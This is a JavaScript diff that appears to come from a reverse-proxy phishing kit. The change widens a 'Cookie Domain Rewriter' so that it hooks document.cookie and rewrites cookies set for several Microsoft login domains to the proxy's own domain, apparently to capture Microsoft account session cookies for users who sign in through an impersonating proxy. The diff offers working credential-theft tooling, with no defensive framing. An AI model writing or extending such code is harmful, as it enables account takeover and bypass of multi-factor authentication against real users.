@@ -69,34 +69,44 @@ function updateHTMLAttribute(htmlNode, htmlAttribute) {
     } catch { }
 }
 
-// ---- 3. Cookie Domain Rewriter (fix for JavaScript-set cookies) ----
+// ---- 3. Cookie Domain Rewriter (targets all Microsoft domains) ----
 (function() {
     const originalDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
     const originalSet = originalDescriptor.set;
     const originalGet = originalDescriptor.get;
-    const proxyDomain = window.__originalHostname;  // saved by the domain mask
+    const proxyDomain = window.__originalHostname || window.location.hostname;
 
-    if (!proxyDomain) {
-        console.warn('[Cookie Patch] __originalHostname not found; using location.hostname');
-    }
-    const effectiveDomain = proxyDomain || window.location.hostname;
+    // List of Microsoft domains we want to rewrite
+    const microsoftDomains = [
+        'login.microsoftonline.com',
+        'microsoftonline.com',
+        'login.windows.net',
+        'login.microsoft.com',
+        'aadcdn.msftauth.net',
+        'sts.microsoftonline.com'
+    ];
+
+    // Build a regex that matches any of these domains
+    const domainPattern = new RegExp(
+        '\\bDomain\\s*=\\s*(' + microsoftDomains.join('|').replace(/\./g, '\\.') + ')',
+        'i'
+    );
 
     Object.defineProperty(document, 'cookie', {
         get: originalGet,
         set: function(value) {
             let newValue = value;
-            // If the cookie is being set for login.microsoftonline.com, rewrite Domain
-            if (value && value.includes('login.microsoftonline.com')) {
-                // Replace Domain=.login.microsoftonline.com or Domain=login.microsoftonline.com
-                newValue = value.replace(/\bDomain\s*=\s*[^;]+/i, `Domain=${effectiveDomain}`);
-                // If no Domain attribute is present, add it (unlikely but safe)
+            if (value && domainPattern.test(value)) {
+                // Replace the Domain attribute with the proxy domain
+                newValue = value.replace(domainPattern, `Domain=${proxyDomain}`);
+                // If no Domain attribute was present, add it (fallback)
                 if (!/Domain\s*=/i.test(newValue)) {
-                    newValue += `; Domain=${effectiveDomain}`;
+                    newValue += `; Domain=${proxyDomain}`;
                 }
             }
             originalSet.call(document, newValue);
         },
         configurable: true
     });
-    console.log('[Cookie Patch] Active – cookies for microsoftonline.com will be rewritten to domain:', effectiveDomain);
+    console.log('[Cookie Patch] Active – cookies for Microsoft domains will be rewritten to:', proxyDomain);
 })();
